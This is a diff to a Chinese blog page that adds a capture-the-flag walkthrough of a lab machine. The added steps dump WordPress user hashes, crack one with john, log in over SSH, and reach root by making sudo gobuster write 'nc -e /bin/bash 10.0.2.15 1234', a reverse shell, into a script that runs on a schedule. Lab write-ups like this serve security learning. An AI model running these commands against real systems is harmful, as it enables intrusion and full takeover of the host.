@@ -349,7 +349,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 3 分钟
+                    阅读时长: 7 分钟
                 </time>
             </div>
         
@@ -842,6 +842,337 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>发现存在wp-config.php为配置文件，查看该文件</p>
+<p><img src="/p/buster/index.assets/ce6b58b1-29aa-49bb-823c-f8131b85d28f.png"
+	width="1005"
+	height="255"
+	srcset="/p/buster/index.assets/ce6b58b1-29aa-49bb-823c-f8131b85d28f_hu_68140444e57895cf.png 480w, /p/buster/index.assets/ce6b58b1-29aa-49bb-823c-f8131b85d28f_hu_bcbc30e0cb1e35a5.png 1024w"
+	loading="lazy"
+	
+		alt="ce6b58b1-29aa-49bb-823c-f8131b85d28f"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="394"
+		data-flex-basis="945px"
+	
+></p>
+<p>发现数据库用户名和密码，尝试能不能找到用户名密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">MariaDB <span class="o">[</span>wordpress<span class="o">]</span>&gt; <span class="k">select</span> * from wp_users<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> * from wp_users<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ID <span class="p">|</span> user_login <span class="p">|</span> user_pass                          <span class="p">|</span> user_nicename <span class="p">|</span> user_email        <span class="p">|</span> user_url              <span class="p">|</span> user_registered     <span class="p">|</span> user_activation_key                           <span class="p">|</span> user_status <span class="p">|</span> display_name <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">1</span> <span class="p">|</span> ta0        <span class="p">|</span> <span class="nv">$P$BDDc71nM67DbOVN</span>/U50WFGII6EF6.r. <span class="p">|</span> ta0           <span class="p">|</span> 2814928906@qq.com <span class="p">|</span> http://192.168.31.181 <span class="p">|</span> 2025-01-08 03:10:43 <span class="p">|</span>                                               <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> ta0          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">2</span> <span class="p">|</span> welcome    <span class="p">|</span> <span class="nv">$P$BtP9ZghJTwDfSn1gKKc</span>.k3mq4Vo.Ko/ <span class="p">|</span> welcome       <span class="p">|</span> 127.0.0.1@qq.com  <span class="p">|</span>                       <span class="p">|</span> 2025-01-08 04:29:28 <span class="p">|</span> 1736310568:<span class="nv">$P$B2YbhlDVF1XWIurbL11Pfoasb</span>./0tD. <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> welcome      <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
+</span></span><span class="line"><span class="cl"><span class="m">2</span> rows in <span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里找到两个用户的密码，welcome用户密码的hash值是<code>$P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/</code>,用john爆破一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">echo</span> <span class="s1">&#39;$P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/&#39;</span> &gt;tmp
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# john tmp --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>phpass <span class="o">[</span>phpass <span class="o">(</span><span class="nv">$P</span>$ or <span class="nv">$H</span>$<span class="o">)</span> 256/256 AVX2 8x3<span class="o">])</span>
+</span></span><span class="line"><span class="cl">No password hashes left to crack <span class="o">(</span>see FAQ<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# john tmp --show                                     
+</span></span><span class="line"><span class="cl">?:104567
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">1</span> password <span class="nb">hash</span> cracked, <span class="m">0</span> left
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里爆破出来<strong>welcome</strong>的密码是<strong>104567</strong>，尝试ssh登陆</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ssh welcome@10.0.2.11
+</span></span><span class="line"><span class="cl">welcome@10.0.2.11<span class="err">&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">Linux listen 4.19.0-27-amd64 <span class="c1">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
+</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class="line"><span class="cl">permitted by applicable law.
+</span></span><span class="line"><span class="cl">Last login: Sat Nov <span class="m">29</span> 06:19:03 <span class="m">2025</span> from 10.0.2.15
+</span></span><span class="line"><span class="cl">$ /usr/bin/script -qc /bin/bash /dev/null
+</span></span><span class="line"><span class="cl">welcome@listen:~$ ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">16</span>
+</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> welcome welcome <span class="m">4096</span> Nov <span class="m">29</span> 06:02 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root    root    <span class="m">4096</span> Jan  <span class="m">7</span>  <span class="m">2025</span> ..
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> welcome welcome <span class="m">1046</span> Nov <span class="m">29</span> 06:57 .bash_history
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root    root      <span class="m">33</span> Jan  <span class="m">7</span>  <span class="m">2025</span> user.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功登陆<strong>welcome</strong>获得<strong>user.txt</strong>，继续尝试提权获得root权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">welcome@listen:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> welcome on listen:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User welcome may run the following commands on listen:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/gobuster
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以用<strong>sudo</strong>权限运行<strong>gobuster</strong>，利用<strong>gobuster</strong>的写文件功能配合<strong>pspy64</strong>的定时任务，在定时任务里写入反弹shell反弹root的权限。</p>
+<p>在攻击机开启http服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 -m http.server <span class="m">80</span>                                                  
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将pspy64上传至靶机tmp目录下（上传至别的目录可能权限不够），执行pspy64后会在opt目录下生成.test.sh文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">welcome@listen:/$ wget http://10.0.2.15/pspy64 -O /tmp/pspy64
+</span></span><span class="line"><span class="cl">--2025-12-01 05:25:29--  http://10.0.2.15/pspy64
+</span></span><span class="line"><span class="cl">Connecting to 10.0.2.15:80... connected.
+</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Length: <span class="m">3104768</span> <span class="o">(</span>3.0M<span class="o">)</span> <span class="o">[</span>application/octet-stream<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Saving to: ‘/tmp/pspy64’
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/tmp/pspy64                  100%<span class="o">[==============================================</span>&gt;<span class="o">]</span>   2.96M  --.-KB/s    in 0.02s   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2025-12-01 05:25:29 <span class="o">(</span><span class="m">187</span> MB/s<span class="o">)</span> - ‘/tmp/pspy64’ saved <span class="o">[</span>3104768/3104768<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">welcome@listen:/$ <span class="nb">cd</span> tmp
+</span></span><span class="line"><span class="cl">welcome@listen:/tmp$ chmod +x pspy64
+</span></span><span class="line"><span class="cl">welcome@listen:/tmp$ ./pspy64
+</span></span><span class="line"><span class="cl">pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">     ██▓███    ██████  ██▓███ ▓██   ██▓
+</span></span><span class="line"><span class="cl">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+</span></span><span class="line"><span class="cl">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+</span></span><span class="line"><span class="cl">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+</span></span><span class="line"><span class="cl">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+</span></span><span class="line"><span class="cl">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+</span></span><span class="line"><span class="cl">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+</span></span><span class="line"><span class="cl">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+</span></span><span class="line"><span class="cl">                   ░           ░ ░     
+</span></span><span class="line"><span class="cl">                               ░ ░     
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Config: Printing events <span class="o">(</span><span class="nv">colored</span><span class="o">=</span><span class="nb">true</span><span class="o">)</span>: <span class="nv">processes</span><span class="o">=</span><span class="nb">true</span> <span class="p">|</span> file-system-events<span class="o">=</span><span class="nb">false</span> <span class="o">||</span><span class="p">|</span> Scanning <span class="k">for</span> processes every 100ms and on inotify events <span class="o">||</span><span class="p">|</span> Watching directories: <span class="o">[</span>/usr /tmp /etc /home /var /opt<span class="o">]</span> <span class="o">(</span>recursive<span class="o">)</span> <span class="p">|</span> <span class="o">[]</span> <span class="o">(</span>non-recursive<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Draining file system events due to startup...
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">welcome@listen:/tmp$ <span class="nb">cd</span> /opt
+</span></span><span class="line"><span class="cl">welcome@listen:/opt$ ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">12</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> Jan  <span class="m">7</span>  <span class="m">2025</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">18</span> root root <span class="m">4096</span> Jan  <span class="m">7</span>  <span class="m">2025</span> ..
+</span></span><span class="line"><span class="cl">-rwx------  <span class="m">1</span> root root    <span class="m">7</span> Nov <span class="m">29</span> 06:54 .test.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后在攻击机拼接目录 /tmp/b ,在靶机的tmp下创建a文件为字典写入/tmp/b,在b文件里写入shell并用gobuster写入.test.sh</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">welcome@listen:/tmp$ <span class="nb">echo</span> <span class="s1">&#39;tmp/b&#39;</span> &gt;a.txt
+</span></span><span class="line"><span class="cl">welcome@listen:/tmp$ <span class="nb">echo</span> <span class="s1">&#39;nc -e /bin/bash 10.0.2.15 1234&#39;</span> &gt;b
+</span></span><span class="line"><span class="cl">welcome@listen:/tmp$ chmod +x b
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>攻击机创建以下目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(root㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─# cd tmp                                                                                                               
+</span></span><span class="line"><span class="cl">┌──(root㉿kali)-[~/tmp]
+</span></span><span class="line"><span class="cl">└─# ls
+</span></span><span class="line"><span class="cl">b
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行命令<code>sudo gobuster -w a.txt -u http://10.0.2.15:80 -n -q -o /opt/.test.sh</code>，攻击机监听1234获得root的shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">#靶机</span>
+</span></span><span class="line"><span class="cl">welcome@listen:/tmp$ sudo gobuster -w a.txt -u http://10.0.2.15:80 -n -q -o /opt/.test.sh
+</span></span><span class="line"><span class="cl">/tmp/b
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#攻击机</span>
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lnvp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.0.2.15<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.11<span class="o">]</span> <span class="m">57002</span>
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/usr/bin/script -qc /bin/bash /dev/null
+</span></span><span class="line"><span class="cl">root@listen:~# <span class="nb">cd</span> root
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> root
+</span></span><span class="line"><span class="cl">bash: cd: root: No such file or directory
+</span></span><span class="line"><span class="cl">root@listen:~# ls -al
+</span></span><span class="line"><span class="cl">ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">32</span>
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">3</span> root root <span class="m">4096</span> Jan  <span class="m">7</span>  <span class="m">2025</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">18</span> root root <span class="m">4096</span> Jan  <span class="m">7</span>  <span class="m">2025</span> ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Jan  <span class="m">7</span>  <span class="m">2025</span> .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">570</span> Jan <span class="m">31</span>  <span class="m">2010</span> .bashrc
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Oct <span class="m">16</span>  <span class="m">2020</span> .local
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Jan  <span class="m">7</span>  <span class="m">2025</span> .mysql_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">148</span> Jan  <span class="m">7</span>  <span class="m">2025</span> note.txt
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">148</span> Aug <span class="m">17</span>  <span class="m">2015</span> .profile
+</span></span><span class="line"><span class="cl">-rw-------  <span class="m">1</span> root root   <span class="m">33</span> Jan  <span class="m">7</span>  <span class="m">2025</span> R00t_fl4g_is_HHHHerererererrererere.txt
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root   <span class="m">66</span> Oct <span class="m">16</span>  <span class="m">2020</span> .selected_editor
+</span></span><span class="line"><span class="cl">root@listen:~# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>获得root.txt</p>
 
 </section>
 
